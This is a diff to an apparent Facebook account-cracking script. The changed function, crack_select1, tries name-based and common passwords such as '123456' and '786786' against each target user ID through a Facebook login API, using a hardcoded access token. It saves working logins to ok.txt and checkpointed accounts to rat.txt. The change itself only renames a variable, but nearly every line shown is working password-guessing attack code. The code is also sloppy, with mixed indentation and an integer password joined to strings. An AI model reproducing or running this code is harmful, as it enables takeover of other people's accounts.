@@ -269,7 +269,7 @@ def crack_select1():
 		try:
 			pass1 = name.lower().split(' ')[0] + '1234'
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-             		q = json.load(data)
+             		d = json.load(data)
 			if "access_token" in data.text and "EAAA" in data.text:
 				print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass1+"\033[0;97m")
 				ok = open("ok.txt", "a")
@@ -277,7 +277,7 @@ def crack_select1():
 				ok.close()
 				oks.append(uid+pass1)
 			else:
-				if "www.facebook.com" in q['error_msg']:
+				if "www.facebook.com" in d['error_msg']:
 					print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass1+"\033[0;97m")
 					cp = open("rat.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
@@ -286,7 +286,7 @@ def crack_select1():
 				else:
 					pass2 = name.lower().split(' ')[0] + '123'
 					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-					q = json.load(data)
+					d = json.load(data)
 					if "access_token" in data.text and "EAAA" in data.text:
 						print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass2+"\033[0;97m")
 						ok = open("ok.txt", "a")
@@ -294,7 +294,7 @@ def crack_select1():
 						ok.close()
 						oks.append(uid+pass2)
 					else:
-						if "www.facebook.com" in q['error_msg']:
+						if "www.facebook.com" in d['error_msg']:
 							print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass2+"\033[0;97m")
 							cp = open("rat.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
@@ -303,7 +303,7 @@ def crack_select1():
 						else:
 							pass3 = name.lower().split(' ')[0] + '12'
 							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-							q = json.load(data)
+							d = json.load(data)
 							if "access_token" in data.text and "EAAA" in data.text:
 								print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass3+"\033[0;97m")
 								ok = open("ok.txt", "a")
@@ -311,7 +311,7 @@ def crack_select1():
 								ok.close()
 								oks.append(uid+pass3)
 							else:
-								if "www.facebook.com" in q['error_msg']:
+								if "www.facebook.com" in d['error_msg']:
 									print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass3+"\033[0;97m")
 									cp = open("rat.txt", "a")
 									cp.write(uid+"|"+pass3+"\n")
@@ -320,7 +320,7 @@ def crack_select1():
 								else:
 									pass4 = name.lower().split(' ')[1] + '1234'
 									data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-									q = json.load(data)
+									d = json.load(data)
 									if "access_token" in data.text and "EAAA" in data.text:
 										print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass4+"\033[0;97m")
 										ok = open("ok.txt", "a")
@@ -328,7 +328,7 @@ def crack_select1():
 										ok.close()
 										oks.append(uid+pass4)
 									else:
-										if "www.facebook.com" in q['error_msg']:
+										if "www.facebook.com" in d['error_msg']:
 											print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass4+"\033[0;97m")
 											cp = open("rat.txt", "a")
 											cp.write(uid+"|"+pass4+"\n")
@@ -337,7 +337,7 @@ def crack_select1():
 										else:
 											pass5 = name.lower().split(' ')[1] + '123'
 											data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-											q = json.load(data)
+											d = json.load(data)
 											if "access_token" in data.text and "EAAA" in data.text:
 												print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass5+"\033[0;97m")
 												ok = open("ok.txt", "a")
@@ -345,7 +345,7 @@ def crack_select1():
 												ok.close()
 												oks.append(uid+pass5)
 											else:
-												if "www.facebook.com" in q['error_msg']:
+												if "www.facebook.com" in d['error_msg']:
 													print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass5+"\033[0;97m")
 													cp = open("rat.txt", "a")
 													cp.write(uid+"|"+pass5+"\n")
@@ -354,7 +354,7 @@ def crack_select1():
 												else:
 													pass6 = name.lower().split(' ')[1] + '12'
 													data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-													q = json.load(data)
+													d = json.load(data)
 													if "access_token" in data.text and "EAAA" in data.text:
 														print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass6+"\033[0;97m")
 														ok = open("ok.txt", "a")
@@ -362,7 +362,7 @@ def crack_select1():
 														ok.close()
 														oks.append(uid+pass6)
 													else:
-														if "www.facebook.com" in q['error_msg']:
+														if "www.facebook.com" in d['error_msg']:
 															print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass6+"\033[0;97m")
 															cp = open("rat.txt", "a")
 															cp.write(uid+"|"+pass6+"\n")
@@ -371,7 +371,7 @@ def crack_select1():
 														else:
 															pass7 = name.lower()
 															data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-															q = json.load(data)
+															d = json.load(data)
 															if "access_token" in data.text and "EAAA" in data.text:
 																print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass7+"\033[0;97m")
 																ok = open("ok.txt", "a")
@@ -379,7 +379,7 @@ def crack_select1():
 																ok.close()
 																oks.append(uid+pass7)
 															else:
-																if "www.facebook.com" in q['error_msg']:
+																if "www.facebook.com" in d['error_msg']:
 																	print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass7+"\033[0;97m")
 																	cp = open("rat.txt", "a")
 																	cp.write(uid+"|"+pass7+"\n")
@@ -388,7 +388,7 @@ def crack_select1():
 																else:
 																	pass8 = name.lower().split(' ')[0] + name.lower().split(' ')[1]
 																	data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-																	q = json.load(data)
+																	d = json.load(data)
 																	if "access_token" in data.text and "EAAA" in data.text:
 																		print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass8+"\033[0;97m")
 																		ok = open("ok.txt", "a")
@@ -396,7 +396,7 @@ def crack_select1():
 																		ok.close()
 																		oks.append(uid+pass8)
 																	else:
-																		if "www.facebook.com" in q['error_msg']:
+																		if "www.facebook.com" in d['error_msg']:
 																			print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass8+"\033[0;97m")
 																			cp = open("rat.txt", "a")
 																			cp.write(uid+"|"+pass8+"\n")
@@ -405,7 +405,7 @@ def crack_select1():
 																		else:
 																  			pass9 = "102030"
 																  			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-																			q = json.load(data)
+																			d = json.load(data)
 																			if "access_token" in data.text and "EAAA" in data.text:
 																  			    print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass9+"\033[0;97m")
 																  			    ok = open("ok.txt", "a")
@@ -413,7 +413,7 @@ def crack_select1():
 																  			    ok.close()
 																  			    oks.append(uid+pass9)
 																			else:
-																  			        if "www.facebook.com" in q['error_msg']:
+																  			        if "www.facebook.com" in d['error_msg']:
 																  			                print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass9+"\033[0;97m")
 																  			                cp = open("rat.txt", "a")
 																  			                cp.write(uid+"|"+pass9+"\n")
@@ -422,7 +422,7 @@ def crack_select1():
 																  			        else:		
 																					pass10 = 223344
 																					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-																					q = json.load(data)
+																					d = json.load(data)
 																					if "access_token" in data.text and "EAAA" in data.text:
 																						print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass10+"\033[0;97m")
 																						ok = open("ok.txt", "a")
@@ -430,7 +430,7 @@ def crack_select1():
 																						ok.close()
 																						oks.append(uid+pass10)
 																  			 		else:
-																  			        		if "www.facebook.com" in q['error_msg']:
+																  			        		if "www.facebook.com" in d['error_msg']:
 																							print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass10+"\033[0;97m")
 																							cp = open("rat.txt", "a")
 																							cp.write(uid+"|"+pass10+"\n")
@@ -439,7 +439,7 @@ def crack_select1():
 																						else:
 																							pass11 = "556677"
 																							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-																							q = json.load(data)
+																							d = json.load(data)
 																							if "access_token" in data.text and "EAAA" in data.text:
 																								print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass11+"\033[0;97m")
 																								ok = open("ok.txt", "a")
@@ -447,7 +447,7 @@ def crack_select1():
 																								ok.close()
 																								oks.append(uid+pass11)
 																							else:
-																								if "www.facebook.com" in q['error_msg']:
+																								if "www.facebook.com" in d['error_msg']:
 																									print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass11+"\033[0;97m")
 																									cp = open("rat.txt", "a")
 																									cp.write(uid+"|"+pass11+"\n")
@@ -456,7 +456,7 @@ def crack_select1():
 																								else:
 																									pass12 = "786786"
 																									data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-																									q = json.load(data)
+																									d = json.load(data)
 																									if "access_token" in data.text and "EAAA" in data.text:
 																										print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass12+"\033[0;97m")
 																										ok = open("ok.txt", "a")
@@ -464,7 +464,7 @@ def crack_select1():
 																										ok.close()
 																										oks.append(uid+pass12)
 																									else:
-																										if "www.facebook.com" in q['error_msg']:
+																										if "www.facebook.com" in d['error_msg']:
 																											print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass12+"\033[0;97m")
 																											cp = open("rat.txt", "a")
 																											cp.write(uid+"|"+pass12+"\n")
@@ -473,7 +473,7 @@ def crack_select1():
 																										else:
 																											pass13 = "123456"
 																											data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-																											q = json.load(data)
+																											d = json.load(data)
 																											if "access_token" in data.text and "EAAA" in data.text:
 																												print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass13+"\033[0;97m")
 																												ok = open("ok.txt", "a")
@@ -481,7 +481,7 @@ def crack_select1():
 																												ok.close()
 																												oks.append(uid+pass13)
 																											else:
-																												if "www.facebook.com" in q['error_msg']:
+																												if "www.facebook.com" in d['error_msg']:
 																													print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass13+"\033[0;97m")
 																													cp = open("rat.txt", "a")
 																													cp.write(uid+"|"+pass13+"\n")
@@ -490,7 +490,7 @@ def crack_select1():
 																												else:
 																													pass14 = "112233"
 																													data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass14 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-																													q = json.load(data)
+																													d = json.load(data)
 																													if "access_token" in data.text and "EAAA" in data.text:
 																														print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass14+"\033[0;97m")
 																														ok = open("ok.txt", "a")
@@ -498,7 +498,7 @@ def crack_select1():
 																														ok.close()
 																														oks.append(uid+pass14)
 																													else:
-																														if "www.facebook.com" in q['error_msg']:
+																														if "www.facebook.com" in d['error_msg']:
 																															print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass14+"\033[0;97m")
 																															cp = open("rat.txt", "a")
 																															cp.write(uid+"|"+pass14+"\n")
@@ -507,7 +507,7 @@ def crack_select1():
 																														else:
 																															pass15 = "123356789"
 																															data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass15 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-																															q = json.load(data)
+																															d = json.load(data)
 																															if "access_token" in data.text and "EAAA" in data.text:
 																																print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass15+"\033[0;97m")
 																																ok = open("ok.txt", "a")
@@ -515,7 +515,7 @@ def crack_select1():
 																																ok.close()
 																																oks.append(uid+pass15)
 																															else:
-																																if "www.facebook.com" in q['error_msg']:
+																																if "www.facebook.com" in d['error_msg']:
 																																	print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass15+"\033[0;97m")
 																																	cp = open("rat.txt", "a")
 																																	cp.write(uid+"|"+pass15+"\n")
